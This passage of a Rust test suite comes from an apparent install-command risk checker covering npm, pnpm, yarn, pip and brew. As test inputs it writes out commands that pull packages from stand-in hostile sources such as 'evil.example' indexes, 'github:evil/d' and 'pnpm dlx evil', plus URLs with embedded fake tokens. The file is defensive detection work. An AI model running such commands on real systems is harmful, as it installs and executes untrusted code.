        "[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )]);
    let f = run("pip install ./proj", t.path());
    assert!(
        one(&f, "install/pip-build-code")
            .evidence
            .excerpt
            .contains("hatchling.build")
    );
    let bad = Tree::with(&[("proj/pyproject.toml", "[unclosed")]);
    let f = run("pip install ./proj", bad.path());
    assert!(ids(&f).contains(&"install/unchecked") && ids(&f).contains(&"install/pip-build-code"));
    assert_eq!(
        ids(&run("pip install ./missing", bad.path()))[0],
        "install/unchecked"
    );
}

#[test]
fn pip_requirements_files_are_followed_and_a_missing_or_deep_one_is_unchecked() {
    let t = Tree::with(&[
        (
            "requirements.txt",
            "requests==2.0  # fine\n-r more/base.txt\n./proj\n",
        ),
        (
            "more/base.txt",
            "git+https://example.invalid/x.git\n-r ../requirements.txt\n",
        ),
        ("proj/setup.py", "x"),
    ]);
    let f = run("pip install -r requirements.txt", t.path());
    assert!(
        f.iter()
            .filter(|f| f.rule_id == "install/pip-build-code")
            .count()
            >= 2
    );
    assert!(
        ids(&f).contains(&"install/unchecked"),
        "the cycle stops at the depth limit"
    );

    let gone = run("pip install -r missing.txt", t.path());
    assert_eq!(ids(&gone), ["install/unchecked"]);
    let big = Tree::with(&[("r.txt", &"a\n".repeat(600_000))]);
    assert_eq!(
        ids(&run("pip install -r r.txt", big.path())),
        ["install/unchecked"]
    );
}

#[test]
fn brew_warns_for_a_tap_outside_homebrew_and_stays_silent_for_core() {
    let gone = Path::new("/nonexistent-code-watch-dir");
    for (cmd, package) in [
        ("brew install someone/tap/tool", "someone/tap/tool"),
        ("brew install --cask someone/tap/app", "someone/tap/app"),
        ("brew tap someone/tap", "someone/tap"),
        (
            "brew tap someone/tap https://example.invalid/x.git",
            "someone/tap",
        ),
        ("brew install ./tool.rb", "./tool.rb"),
        (
            "brew install https://example.invalid/tool.rb",
            "https://example.invalid/tool.rb",
        ),
        ("brew upgrade someone/tap/tool", "someone/tap/tool"),
    ] {
        let f = run(cmd, gone);
        assert_eq!(ids(&f), ["install/brew-unknown-tap"], "{cmd}");
        assert_eq!(f[0].severity, Severity::Warn);
        assert_eq!(f[0].package.as_deref(), Some(package));
    }
    for cmd in [
        "brew install wget",
        "brew install --formula wget jq",
        "brew install homebrew/core/wget",
        "brew install Homebrew/cask/foo",
        "brew tap homebrew/cask",
        "brew tap",
        "brew update",
    ] {
        assert!(run(cmd, gone).is_empty(), "{cmd}");
    }
    assert_eq!(run("brew install wget someone/tap/tool", gone).len(), 1);
}

fn snapshot(dir: &Path) -> Vec<(PathBuf, Vec<u8>)> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(d) = stack.pop() {
        for e in fs::read_dir(&d).unwrap().flatten() {
            let p = e.path();
            if p.is_dir() {
                stack.push(p);
            } else {
                out.push((p.clone(), fs::read(&p).unwrap()));
            }
        }
    }
    out.sort();
    out
}

#[test]
fn checking_installs_changes_no_file() {
    let t = pnpm_tree(PNPM_WORKSPACE, PNPM_10, true);
    t.write("proj/setup.py", "import subprocess");
    t.write("requirements.txt", "./proj\n");
    t.write(".npmrc", "ignore-scripts=false\n");
    let before = snapshot(t.path());
    for cmd in [
        "pnpm install",
        "npm install",
        "yarn install",
        "pip install -r requirements.txt",
        "cd proj && pip install .",
        "brew install a/b/c",
    ] {
        run(cmd, t.path());
    }
    assert_eq!(snapshot(t.path()), before);
}

#[test]
fn the_install_module_cannot_run_a_program_write_or_reach_the_network() {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src/install");
    for entry in fs::read_dir(dir).unwrap().flatten() {
        let text = fs::read_to_string(entry.path()).unwrap();
        for forbidden in [
            "std::process",
            "Command::new",
            "fs::write",
            "fs::remove",
            "fs::rename",
            "create_dir",
            "File::create",
            "OpenOptions",
            "ureq",
            "TcpStream",
        ] {
            assert!(
                !text.contains(forbidden),
                "{} uses {forbidden}",
                entry.path().display()
            );
        }
    }
}

#[test]
fn commands_that_run_install_time_code_but_are_not_analysed_are_not_checked() {
    let gone = Path::new("/nonexistent-code-watch-dir");
    for (cmd, said) in [
        ("npm update", "npm update"),
        ("npm up", "npm up"),
        ("npm upgrade", "npm upgrade"),
        ("npm rebuild", "npm rebuild"),
        ("npm link", "npm link"),
        ("npm dedupe", "npm dedupe"),
        ("npm exec foo", "npm exec"),
        ("npx foo", "npx"),
        ("pnpx foo", "pnpx"),
        ("yarn workspace foo add x", "yarn workspace add"),
        (
            "yarn workspaces foreach run x install",
            "yarn workspaces install",
        ),
        ("yarn up", "yarn up"),
        ("yarn upgrade", "yarn upgrade"),
        ("yarn dlx x", "yarn dlx"),
        ("pnpm update", "pnpm update"),
        ("pnpm up", "pnpm up"),
        ("pnpm rebuild", "pnpm rebuild"),
        ("pnpm recursive install", "pnpm recursive install"),
        ("pnpm m i", "pnpm m i"),
        ("pnpm approve-builds", "pnpm approve-builds"),
        ("pnpm dlx evil", "pnpm dlx"),
        ("uv pip install x", "uv pip install"),
        ("uv sync", "uv sync"),
        ("uvx tool", "uvx"),
        ("bun install", "bun install"),
        ("bunx tool", "bunx"),
        ("pipx install x", "pipx install"),
        ("poetry install", "poetry install"),
        ("brew bundle", "brew bundle"),
    ] {
        let f = run(cmd, gone);
        assert_eq!(ids(&f), ["install/unchecked"], "{cmd}");
        assert_eq!(f[0].severity, Severity::Warn, "{cmd}");
        assert!(
            f[0].evidence
                .excerpt
                .contains(&format!("not checked: {said}")),
            "{cmd}: {}",
            f[0].evidence.excerpt
        );
    }
}

#[test]
fn an_install_word_is_found_past_a_value_flag_the_layer_does_not_know() {
    let t = Tree::with(&[("package.json", &manifest(r#""postinstall":"x""#))]);
    for cmd in [
        "npm --install-strategy hoisted i",
        "npm --script-shell sh install",
        "npm --some-unknown-flag value i",
        "npm --otp 123456 ci",
    ] {
        let f = run(cmd, t.path());
        assert!(ids(&f).contains(&"install/lifecycle-script"), "{cmd}");
    }
}

#[test]
fn ignore_scripts_takes_a_following_true_or_false_word_as_its_value() {
    let t = Tree::with(&[("package.json", &manifest(r#""postinstall":"x""#))]);
    let f = run("npm i --ignore-scripts false", t.path());
    assert!(ids(&f).contains(&"install/lifecycle-script"));
    assert!(!ids(&f).contains(&"install/no-scripts"));
    assert_eq!(
        ids(&run("npm i --ignore-scripts true", t.path())),
        ["install/no-scripts"]
    );
}

#[test]
fn scripts_off_does_not_claim_that_nothing_runs() {
    let t = Tree::with(&[("package.json", &manifest(""))]);
    let f = run("npm i --ignore-scripts", t.path());
    let n = one(&f, "install/no-scripts");
    assert!(!n.title.contains("nothing runs") && !n.evidence.excerpt.contains("nothing runs"));
    assert!(n.title.contains("Lifecycle scripts"));
    assert!(n.evidence.excerpt.contains("npm_config_ignore_scripts"));
}

#[test]
fn repository_code_that_runs_on_install_is_its_own_warning_whatever_ignore_scripts_says() {
    let pnpm = Tree::with(&[
        ("package.json", &manifest("")),
        ("pnpm-workspace.yaml", "ignoreScripts: true\n"),
        (".pnpmfile.cjs", "module.exports = {}\n"),
    ]);
    let f = run("pnpm install", pnpm.path());
    assert_eq!(
        one(&f, "install/repo-code-at-install").severity,
        Severity::Warn
    );
    assert!(ids(&f).contains(&"install/no-scripts"));

    let setting = Tree::with(&[
        ("package.json", &manifest("")),
        ("pnpm-workspace.yaml", "pnpmfile: hooks/pnpmfile.cjs\n"),
    ]);
    assert!(ids(&run("pnpm i", setting.path())).contains(&"install/repo-code-at-install"));

    for rc in [
        "yarnPath: .yarn/releases/yarn.cjs\n",
        "plugins:\n  - path: .yarn/plugins/x.cjs\n",
    ] {
        let berry = Tree::with(&[
            ("package.json", &manifest("")),
            ("yarn.lock", YARN_BERRY),
            (".yarnrc.yml", rc),
        ]);
        let f = run("yarn install", berry.path());
        assert_eq!(
            one(&f, "install/repo-code-at-install").severity,
            Severity::Warn,
            "{rc}"
        );
    }
    let plain = Tree::with(&[("package.json", &manifest("")), ("yarn.lock", YARN_BERRY)]);
    assert!(!ids(&run("yarn install", plain.path())).contains(&"install/repo-code-at-install"));
}

#[test]
fn yarn_berry_reads_yarnrc_yml_not_npmrc_and_still_runs_the_projects_own_scripts() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""postinstall":"x""#)),
        ("yarn.lock", YARN_BERRY),
        (".npmrc", "ignore-scripts=true\n"),
    ]);
    let f = run("yarn install", t.path());
    assert!(ids(&f).contains(&"install/lifecycle-script"));
    assert!(!ids(&f).contains(&"install/no-scripts"));
    let flagged = run("yarn install --ignore-scripts", t.path());
    assert!(ids(&flagged).contains(&"install/lifecycle-script"));
}

#[test]
fn a_package_with_a_binding_gyp_counts_as_an_install_script() {
    let t = pnpm_tree(PNPM_WORKSPACE, PNPM_10, false);
    t.write(
        "node_modules/.pnpm/esbuild@0.21.5/node_modules/esbuild/package.json",
        r#"{"name":"esbuild"}"#,
    );
    let without = run("pnpm install", t.path());
    assert!(!ids(&without).contains(&"install/dependency-scripts"));
    t.write(
        "node_modules/.pnpm/esbuild@0.21.5/node_modules/esbuild/binding.gyp",
        "{}",
    );
    let f = run("pnpm install", t.path());
    assert!(
        one(&f, "install/dependency-scripts")
            .evidence
            .excerpt
            .contains("esbuild")
    );
}

#[test]
fn an_only_built_dependencies_file_is_read_inside_the_project_or_means_may_run() {
    let with_file = |file: Option<&str>, setting: &str| {
        let t = pnpm_tree(
            &format!("onlyBuiltDependenciesFile: {setting}\n"),
            PNPM_10,
            true,
        );
        if let Some(text) = file {
            t.write("allow.json", text);
        }
        run("pnpm install", t.path())
    };
    let f = with_file(Some(r#"["esbuild"]"#), "allow.json");
    assert!(
        one(&f, "install/dependency-scripts")
            .evidence
            .excerpt
            .contains("will run")
    );
    let f = with_file(Some(r#"["other"]"#), "allow.json");
    assert!(ids(&f).contains(&"install/dependency-scripts-blocked"));
    for (file, setting) in [
        (None, "allow.json"),
        (Some("not json"), "allow.json"),
        (Some(r#"["esbuild"]"#), "../allow.json"),
        (Some(r#"["esbuild"]"#), "/etc/allow.json"),
    ] {
        let f = with_file(file, setting);
        let d = one(&f, "install/dependency-scripts");
        assert!(
            d.evidence.excerpt.contains("may run"),
            "{setting}: {}",
            d.evidence.excerpt
        );
    }
}

#[test]
fn a_member_directory_reads_the_lockfile_of_the_workspace_root() {
    let t = Tree::with(&[
        (
            "package.json",
            r#"{"name":"x","workspaces":["packages/*"]}"#,
        ),
        ("package-lock.json", NPM_LOCK),
        (
            "packages/a/package.json",
            &with_dependency(r#""esbuild":"0.21.5""#),
        ),
    ]);
    let f = run("npm ci --prefix packages/a", t.path());
    assert!(
        one(&f, "install/dependency-scripts")
            .evidence
            .excerpt
            .contains("esbuild")
    );
    assert!(!ids(&f).contains(&"install/dependency-scripts-unknown"));

    let pnpm = Tree::with(&[
        ("package.json", PNPM_10),
        ("pnpm-lock.yaml", PNPM_LOCK),
        (
            "pnpm-workspace.yaml",
            "ignoreScripts: true\npackages:\n  - packages/*\n",
        ),
        ("packages/a/package.json", &manifest(r#""postinstall":"x""#)),
    ]);
    assert_eq!(
        ids(&run("pnpm install --dir packages/a", pnpm.path())),
        ["install/no-scripts"]
    );
}

#[test]
fn dependencies_from_git_or_a_url_may_run_prepare_and_are_warned_per_dependency() {
    for spec in [
        "github:evil/d",
        "git+ssh://git@github.com/evil/d.git",
        "https://example.invalid/d.tgz",
        "file:../d",
        "link:../d",
        "evil/d#main",
    ] {
        let t = Tree::with(&[
            (
                "package.json",
                &with_dependency(&format!(r#""d":"{spec}""#)),
            ),
            (
                "package-lock.json",
                r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/d":{"version":"1.0.0"}}}"#,
            ),
        ]);
        let f = run("npm ci", t.path());
        let d = one(&f, "install/dependency-scripts");
        assert_eq!(d.severity, Severity::Warn, "{spec}");
        assert_eq!(d.package.as_deref(), Some("d"), "{spec}");
        assert!(d.evidence.excerpt.contains("prepare"), "{spec}");
        assert!(!ids(&f).contains(&"install/no-script-found"), "{spec}");
    }
    let registry = Tree::with(&[
        (
            "package.json",
            &with_dependency(r#""d":"^1.2.3","e":"npm:d@1","@s/f":"~2""#),
        ),
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/d":{},"node_modules/e":{},"node_modules/@s/f":{}}}"#,
        ),
    ]);
    assert_eq!(
        ids(&run("npm ci", registry.path())),
        ["install/no-script-found"]
    );
}

#[test]
fn a_lock_entry_that_is_not_a_registry_tarball_is_warned_in_every_lockfile_format() {
    let npm = Tree::with(&[
        ("package.json", &with_dependency(r#""d":"1""#)),
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/d":{"resolved":"git+ssh://git@github.com/evil/d.git#abc"}}}"#,
        ),
    ]);
    let pnpm = Tree::with(&[
        ("package.json", &with_dependency(r#""d":"1""#)),
        ("pnpm-workspace.yaml", "packages:\n  - \".\"\n"),
        (
            "pnpm-lock.yaml",
            "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      d:\n        specifier: '1'\n        version: 1.0.0\npackages:\n  d@1.0.0:\n    resolution: {tarball: 'https://example.invalid/d.tgz'}\n",
        ),
        (
            "node_modules/.pnpm/d@1.0.0/node_modules/d/package.json",
            r#"{"name":"d"}"#,
        ),
    ]);
    let berry = Tree::with(&[
        ("package.json", &with_dependency(r#""d":"1""#)),
        (
            "yarn.lock",
            "__metadata:\n  version: 8\n\n\"d@git@github.com:evil/d.git#commit=abc\":\n  version: 1.0.0\n  resolution: \"d@git@github.com:evil/d.git#commit=abc\"\n",
        ),
    ]);
    for (cmd, t) in [
        ("npm ci", &npm),
        ("pnpm install", &pnpm),
        ("yarn install", &berry),
    ] {
        let f = run(cmd, t.path());
        let d = one(&f, "install/dependency-scripts");
        assert_eq!(d.package.as_deref(), Some("d"), "{cmd}");
    }
}

#[test]
fn a_source_address_never_prints_credentials() {
    let t = Tree::with(&[
        (
            "package.json",
            &with_dependency(r#""d":"https://user:s3cr3t@example.invalid/d.git""#),
        ),
        (
            "package-lock.json",
            r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/d":{}}}"#,
        ),
    ]);
    let f = run("npm ci", t.path());
    let text = format!("{f:?}");
    assert!(
        !text.contains("s3cr3t") && !text.contains("user:"),
        "{text}"
    );
    assert!(text.contains("example.invalid"));
}

const NOISE_NPM_LOCK: &str = r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/left-pad":{"version":"1.3.0","resolved":"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"}}}"#;

fn worst(findings: &[Finding]) -> &'static str {
    match findings.iter().map(|f| f.severity).max() {
        Some(Severity::Block) => "block",
        Some(Severity::Warn) => "warn",
        Some(_) => "info",
        None => "none",
    }
}

/// Everyday commands in clean projects and what each says: the layer must not warn about what it cannot know to be risky.
#[test]
fn everyday_commands_say_what_the_noise_table_expects() {
    let npm_lock = Tree::with(&[
        ("package.json", &with_dependency(r#""left-pad":"1.3.0""#)),
        ("package-lock.json", NOISE_NPM_LOCK),
    ]);
    let npm_none = Tree::with(&[("package.json", &with_dependency(r#""left-pad":"1.3.0""#))]);
    let pnpm10 = Tree::with(&[
        ("package.json", PNPM_10),
        ("pnpm-lock.yaml", PNPM_LOCK),
        ("pnpm-workspace.yaml", "packages:\n  - \".\"\n"),
    ]);
    let pnpm_unknown = Tree::with(&[
        ("package.json", r#"{"name":"fx"}"#),
        ("pnpm-lock.yaml", PNPM_LOCK),
        ("pnpm-workspace.yaml", "packages:\n  - \".\"\n"),
    ]);
    let yarn1 = Tree::with(&[("package.json", &manifest("")), ("yarn.lock", YARN_1)]);
    let reqs = Tree::with(&[("requirements.txt", "requests==2.31.0\nflask\n")]);
    let table: [(&str, &Tree, &str); 13] = [
        ("pip install requests", &reqs, "info"),
        ("pip install -U pip", &reqs, "info"),
        ("pip install --user black pytest", &reqs, "info"),
        ("pip install -r requirements.txt", &reqs, "info"),
        (
            "pip install --require-hashes -r requirements.txt",
            &reqs,
            "info",
        ),
        ("pip install --only-binary :all: requests", &reqs, "info"),
        ("npm ci", &npm_lock, "info"),
        ("npm i lodash", &npm_lock, "warn"),
        ("npm install -D typescript", &npm_lock, "warn"),
        ("npm i", &npm_none, "warn"),
        ("pnpm install", &pnpm10, "info"),
        ("pnpm install", &pnpm_unknown, "warn"),
        ("yarn install", &yarn1, "warn"),
    ];
    for (cmd, tree, want) in table {
        assert_eq!(worst(&run(cmd, tree.path())), want, "{cmd}");
    }
    for cmd in [
        "brew install jq",
        "brew install node git",
        "pip list",
        "pip freeze",
    ] {
        assert_eq!(worst(&run(cmd, reqs.path())), "none", "{cmd}");
    }
}

#[test]
fn pip_from_a_directory_a_vcs_address_or_an_archive_stays_a_warn_even_with_index_names() {
    let t = Tree::with(&[("proj/setup.py", "x")]);
    for cmd in [
        "pip install requests ./proj",
        "pip install requests git+https://example.invalid/x.git",
        "pip install --no-binary requests requests",
    ] {
        assert_eq!(worst(&run(cmd, t.path())), "warn", "{cmd}");
    }
}

#[test]
fn pnpm_10_with_an_allowed_build_that_is_not_installed_still_warns() {
    let t = pnpm_tree(PNPM_WORKSPACE, PNPM_10, false);
    assert_eq!(worst(&run("pnpm install", t.path())), "warn");
    let old = pnpm_tree(
        "packages:\n  - \".\"\n",
        r#"{"packageManager":"pnpm@9.15.0"}"#,
        false,
    );
    assert_eq!(worst(&run("pnpm install", old.path())), "warn");
}

#[test]
fn yarn_berry_without_settings_may_run_dependency_scripts() {
    let t = Tree::with(&[
        ("package.json", &with_dependency(r#""left-pad":"1.3.0""#)),
        ("yarn.lock", YARN_BERRY),
    ]);
    let f = run("yarn install", t.path());
    let d = one(&f, "install/dependency-scripts-unknown");
    assert_eq!(d.severity, Severity::Warn);
    assert!(!d.evidence.excerpt.contains("does not run"));
    assert_eq!(worst(&f), "warn");
    t.write(".yarnrc.yml", "nodeLinker: node-modules\n");
    assert_eq!(worst(&run("yarn install", t.path())), "warn");
    t.write(".yarnrc.yml", "enableScripts: false\n");
    assert_eq!(worst(&run("yarn install", t.path())), "info");
    t.write(".yarnrc.yml", "nodeLinker: node-modules\n");
    for cmd in [
        "yarn install --mode=skip-build",
        "yarn install --mode skip-build",
    ] {
        assert_eq!(worst(&run(cmd, t.path())), "info", "{cmd}");
    }
    assert_eq!(
        worst(&run("yarn install --mode=update-lockfile", t.path())),
        "warn"
    );
}

#[test]
fn a_command_line_scripts_flag_beats_the_projects_settings() {
    let npm = Tree::with(&[
        ("package.json", &manifest(r#""postinstall":"x""#)),
        (".npmrc", "ignore-scripts=true\n"),
    ]);
    assert_eq!(ids(&run("npm i", npm.path())), ["install/no-scripts"]);
    for cmd in [
        "npm i --ignore-scripts=false",
        "npm i --ignore-scripts false",
        "npm i --no-ignore-scripts",
        "npm i --ignore-scripts --ignore-scripts=false",
        "npm i --ignore-scripts=false evil",
    ] {
        let f = run(cmd, npm.path());
        assert!(!ids(&f).contains(&"install/no-scripts"), "{cmd}");
        assert!(ids(&f).contains(&"install/lifecycle-script"), "{cmd}");
    }
    assert_eq!(
        ids(&run(
            "npm i --no-ignore-scripts --ignore-scripts",
            npm.path()
        )),
        ["install/no-scripts"]
    );
    let pnpm = Tree::with(&[
        ("package.json", PNPM_10),
        ("pnpm-workspace.yaml", "ignoreScripts: true\n"),
    ]);
    assert!(
        !ids(&run("pnpm i --ignore-scripts=false", pnpm.path())).contains(&"install/no-scripts")
    );
}

#[test]
fn a_flag_after_double_dash_is_a_positional_for_npm() {
    let t = Tree::with(&[("package.json", &manifest(""))]);
    let f = run("npm i evil -- --ignore-scripts", t.path());
    assert!(!ids(&f).contains(&"install/no-scripts"));
    assert!(ids(&f).contains(&"install/dependency-scripts"));
}

const TOKEN: &str = "SECRETTOK123";

fn assert_no_token(f: &[Finding], what: &str) {
    let text = format!("{f:?}{}", serde_json::to_string(f).unwrap());
    assert!(!text.contains(TOKEN), "{what}: {text}");
}

#[test]
fn no_credential_is_printed_from_any_address_in_any_position() {
    let t = Tree::with(&[
        (
            "package.json",
            &with_dependency(&format!(
                r#""e":"https://host.invalid/e.tgz?token={TOKEN}","g":"https://host.invalid?token={TOKEN}","h":"git+https://host.invalid/h.git#{TOKEN}""#
            )),
        ),
        (
            "package-lock.json",
            &format!(
                r#"{{"lockfileVersion":3,"packages":{{"":{{}},"node_modules/e":{{"resolved":"https://host.invalid/e.tgz?token={TOKEN}"}},"node_modules/g":{{"resolved":"https://host.invalid/g.tgz#{TOKEN}"}},"node_modules/h":{{}}}}}}"#
            ),
        ),
        (
            "requirements.txt",
            &format!(
                "git+https://user:{TOKEN}@host.invalid/x.git\nhttps://{TOKEN}@host.invalid/x.tgz\n"
            ),
        ),
    ]);
    for cmd in [
        "npm ci".to_string(),
        format!("npm i git+https://user:{TOKEN}@host.invalid/d.git"),
        format!("npm i https://host.invalid/e.tgz?token={TOKEN}"),
        format!("npm i -g https://{TOKEN}@host.invalid/x.tgz"),
        format!("yarn add https://{TOKEN}@host.invalid/x.tgz"),
        format!("pnpm add github:owner/repo#{TOKEN}"),
        format!("pip install git+https://user:{TOKEN}@host.invalid/x.git"),
        format!("pip install https://{TOKEN}@host.invalid/x.tgz"),
        format!("pip install 'https://host.invalid/x.tgz?token={TOKEN}'"),
        format!("pip install 'pkg @ https://user:{TOKEN}@host.invalid/x.tgz'"),
        "pip install -r requirements.txt".to_string(),
        format!("brew install https://user:{TOKEN}@host.invalid/f.rb"),
        format!("brew install --formula https://host.invalid/f.rb?token={TOKEN}"),
    ] {
        let f = run(&cmd, t.path());
        assert!(!f.is_empty(), "{cmd}");
        assert_no_token(&f, &cmd);
    }
    let f = run("npm ci", t.path());
    assert!(format!("{f:?}").contains("host.invalid"));
}

#[test]
fn an_unrelated_parent_lockfile_is_not_this_projects() {
    let outer = Tree::with(&[
        ("package-lock.json", LEFT_PAD_LOCK),
        (
            "proj/package.json",
            &with_dependency(r#""left-pad":"1.3.0""#),
        ),
        (
            "member/package.json",
            &with_dependency(r#""left-pad":"1.3.0""#),
        ),
    ]);
    let f = run("npm i", &outer.path().join("proj"));
    assert!(ids(&f).contains(&"install/dependency-scripts-unknown"));
    assert!(!ids(&f).contains(&"install/no-script-found"));

    outer.write("package.json", r#"{"name":"o","workspaces":["member"]}"#);
    let f = run("npm ci", &outer.path().join("member"));
    assert!(
        ids(&f).contains(&"install/no-script-found"),
        "{:?}",
        ids(&f)
    );
    let f = run("npm ci", &outer.path().join("proj"));
    assert!(!ids(&f).contains(&"install/no-script-found"));

    outer.write(
        "package.json",
        r#"{"name":"o","workspaces":["*","!member"]}"#,
    );
    let f = run("npm ci", &outer.path().join("member"));
    assert!(!ids(&f).contains(&"install/no-script-found"));
}

#[test]
fn install_aliases_and_corepack_are_judged_like_the_install_they_run() {
    let t = Tree::with(&[("package.json", &manifest(r#""postinstall":"x""#))]);
    for cmd in [
        "npm ic",
        "npm install-clean",
        "npm isntall-clean",
        "npm cit",
        "npm install-ci-test",
        "pnpm it",
        "pnpm install-test",
        "corepack pnpm i",
        "corepack npm install",
        "corepack yarn install",
        "corepack pnpm@9 i",
        "corepack pnpm@9.1.0 install",
        "corepack yarn@4.1.0 install",
        "corepack npm@10 install",
    ] {
        assert!(
            ids(&run(cmd, t.path())).contains(&"install/lifecycle-script"),
            "{cmd}"
        );
    }
    assert!(run("corepack enable", t.path()).is_empty());
    assert!(run("corepack pnpm run build", t.path()).is_empty());
    assert!(run("corepack pnpm@9 run build", t.path()).is_empty());
    assert!(run("corepack enable pnpm@9", t.path()).is_empty());
}

#[test]
fn an_allow_file_that_leaves_the_project_through_a_symlink_is_not_read() {
    #[cfg(unix)]
    {
        let outside = Tree::with(&[("names.json", r#"["esbuild"]"#)]);
        let t = pnpm_tree("onlyBuiltDependenciesFile: names.json\n", PNPM_10, true);
        std::os::unix::fs::symlink(
            outside.path().join("names.json"),
            t.path().join("names.json"),
        )
        .unwrap();
        let f = run("pnpm install", t.path());
        let d = one(&f, "install/dependency-scripts");
        assert!(
            d.evidence.excerpt.contains("may run"),
            "{}",
            d.evidence.excerpt
        );
        let ok = pnpm_tree("onlyBuiltDependenciesFile: names.json\n", PNPM_10, true);
        ok.write("names.json", r#"["esbuild"]"#);
        let f = run("pnpm install", ok.path());
        assert!(
            one(&f, "install/dependency-scripts")
                .evidence
                .excerpt
                .contains("will run")
        );
    }
}

#[test]
fn builds_allowed_on_the_command_line_or_in_npmrc_are_not_reported_as_blocked() {
    let blocked = |extra_args: &str, npmrc: Option<&str>| {
        let t = pnpm_tree("packages:\n  - \".\"\n", PNPM_10, true);
        if let Some(text) = npmrc {
            t.write(".npmrc", text);
        }
        run(&format!("pnpm install {extra_args}"), t.path())
    };
    let f = blocked("", None);
    assert!(ids(&f).contains(&"install/dependency-scripts-blocked"));
    for args in [
        "--dangerously-allow-all-builds",
        "--dangerously-allow-all-builds=true",
        "--config.dangerously-allow-all-builds",
        "--config.dangerously-allow-all-builds=true",
        "--config.only-built-dependencies[]=esbuild",
        "--config.onlyBuiltDependencies[]=esbuild",
        "--allow-build=esbuild",
        "--allow-build esbuild",
    ] {
        let f = blocked(args, None);
        assert!(
            one(&f, "install/dependency-scripts")
                .evidence
                .excerpt
                .contains("will run")
                && !ids(&f).contains(&"install/dependency-scripts-blocked"),
            "{args}: {:?}",
            ids(&f)
        );
    }
    for args in [
        "--dangerously-allow-all-builds=false",
        "--config.dangerously-allow-all-builds=false",
        "--config.fetch-retries=2",
    ] {
        assert!(
            ids(&blocked(args, None)).contains(&"install/dependency-scripts-blocked"),
            "{args}"
        );
    }
    for rc in [
        "dangerously-allow-all-builds=true\n",
        "registry=https://r.example/\ndangerously-allow-all-builds = \"true\"\n",
        "only-built-dependencies[]=esbuild\n",
        "only-built-dependencies=esbuild\n",
    ] {
        let f = blocked("", Some(rc));
        assert!(
            ids(&f).contains(&"install/dependency-scripts")
                && !ids(&f).contains(&"install/dependency-scripts-blocked"),
            "{rc}: {:?}",
            ids(&f)
        );
    }
    for rc in [
        "dangerously-allow-all-builds=false\n",
        "# dangerously-allow-all-builds=true\n",
        "; only-built-dependencies[]=esbuild\n",
        "ignore-scripts=false\n",
    ] {
        assert!(
            ids(&blocked("", Some(rc))).contains(&"install/dependency-scripts-blocked"),
            "{rc}"
        );
    }
}

#[test]
fn a_pip_install_from_another_index_or_link_source_is_not_quiet() {
    let t = Tree::with(&[
        ("wh/.keep", ""),
        (
            "req-index.txt",
            "--index-url https://evil.example/simple\nrequests\n",
        ),
    ]);
    for cmd in [
        "pip install --extra-index-url https://evil.example/simple requests",
        "pip install -i https://evil.example/simple requests",
        "pip install --index-url https://evil.example/simple requests",
        "pip install --index-url=https://evil.example/simple requests",
        "pip install -ihttps://evil.example/simple requests",
        "pip install --trusted-host evil.example -i http://evil.example/simple x",
        "pip install -f https://evil.example/links x",
        "pip install --find-links ./wh x",
        "pip install --no-index -f ./wh x",
        "pip install -r req-index.txt",
        "python3 -m pip install --extra-index-url https://evil.example/simple requests",
    ] {
        let f = run(cmd, t.path());
        let d = one(&f, "install/pip-build-code");
        assert_eq!(d.severity, Severity::Warn, "{cmd}");
        assert!(d.evidence.excerpt.contains("other than PyPI"), "{cmd}");
        assert!(
            !d.evidence.excerpt.contains("evil.example"),
            "{cmd}: {}",
            d.evidence.excerpt
        );
    }
    for cmd in [
        "pip install requests",
        "pip install --user black pytest",
        "pip install -U pip",
        "pip install --retries 2 --timeout 5 requests",
    ] {
        let f = run(cmd, t.path());
        assert_eq!(
            one(&f, "install/pip-build-code").severity,
            Severity::Info,
            "{cmd}"
        );
    }
}

/// Through the command parser, as `code-watch check` runs it: a pinned requirement is a word of the
/// command, not an assignment the parser sets aside.
#[test]
fn a_pinned_pip_requirement_reaches_the_install_check() {
    let t = Tree::new();
    let check = |cmd: &str| {
        Engine::embedded()
            .unwrap()
            .check_command_in(cmd, Some(t.path()), &Allowlists::empty())
            .findings()
            .to_vec()
    };
    let f = check("pip install requests==2.0 flask");
    assert!(
        one(&f, "install/pip-build-code")
            .evidence
            .excerpt
            .contains("flask, requests"),
        "{:?}",
        f.iter().map(|x| &x.evidence.excerpt).collect::<Vec<_>>()
    );
    for cmd in [
        "pip install -i https://evil.example/simple requests==2.0",
        "pip install --extra-index-url https://evil.example/simple requests==2.0",
        "python3 -m pip install -f ./wh requests==2.0",
    ] {
        let f = check(cmd);
        assert_eq!(
            one(&f, "install/pip-build-code").severity,
            Severity::Warn,
            "{cmd}"
        );
    }
}
